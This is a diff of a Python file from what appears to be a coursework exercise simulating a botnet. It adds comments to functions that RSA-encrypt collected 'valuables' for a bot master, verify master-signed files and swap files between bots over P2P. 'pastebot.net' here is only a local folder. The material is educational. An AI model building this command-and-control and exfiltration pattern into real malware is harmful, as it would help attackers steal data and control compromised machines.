@@ -13,17 +13,21 @@ valuables = []
 
 ###
 
+
 def save_valuable(data):
     valuables.append(data)
 
+
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-	
+    # Import the public key from the pastebot.net
+    # If the key does not exist, this program will exit, bot should call Master to generate the master key
     public_key = RSA.importKey(open('../pastebot.net/mykeypublic.pem').read())
     cipher = Crypto.Cipher.PKCS1_v1_5.new(public_key)
     ciphertext = cipher.encrypt(data)
-	
+
     return ciphertext
+
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -40,6 +44,7 @@ def upload_valuables_to_pastebot(fn):
 
 ###
 
+
 def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
@@ -50,24 +55,30 @@ def verify_file(f):
     #     return True
     # return False
 
+    # Split the signature and original file
     lines = f.split(bytes("\nMessage_Start_Here\n", "ascii"), 1)	
-    
+
+    # The signature does not exist, the file is not signed by Master
     if len(lines) < 2:
         print("This file has not been signed by the master.")
         return False
-	
+
     signature = lines[0]
     message_encoded = lines[1]
+    # Import the public key stored in the pastebot.net
+    # If the key does not exist, the program will exit
     key_verifier = RSA.importKey(open('../pastebot.net/mykeypublic.pem').read())
     h_verifier = SHA.new(message_encoded)
+    # Get the verifier from the stored file
     verifier = Crypto.Signature.PKCS1_v1_5.new(key_verifier)
+    # Use the verify function to judge if this file is signed by the master
     if verifier.verify(h_verifier, signature):
         print("The signature is authentic.")
         return True
     else:
         print("The signature is not authentic.")
         return False
-	
+
 
 def process_file(fn, f):
     if verify_file(f):
@@ -79,6 +90,7 @@ def process_file(fn, f):
     else:
         print("The file has not been signed by the botnet master")
 
+
 def download_from_pastebot(fn):
     # "Download" the file from pastebot.net
     # (i.e. pretend we are and grab it from disk)
@@ -89,6 +101,7 @@ def download_from_pastebot(fn):
     f = open(os.path.join("../pastebot.net", fn), "rb").read()
     process_file(fn, f)
 
+
 def p2p_download_file(sconn):
     # Download the file from the other bot
     fn = str(sconn.recv(), "ascii")
@@ -97,6 +110,7 @@ def p2p_download_file(sconn):
     process_file(fn, f)
 
 ###
+
 
 def p2p_upload_file(sconn, fn):
     # Grab the file and upload it to the other bot
@@ -108,8 +122,10 @@ def p2p_upload_file(sconn, fn):
         return
     print("Sending %s via P2P" % fn)
     fn_encoded = fn.encode("ascii")
+    # The parameter of function send should be bytes, not string
     sconn.send(fn_encoded)
     sconn.send(filestore[fn])
+
 
 def run_file(f):
     # If the file can be run,
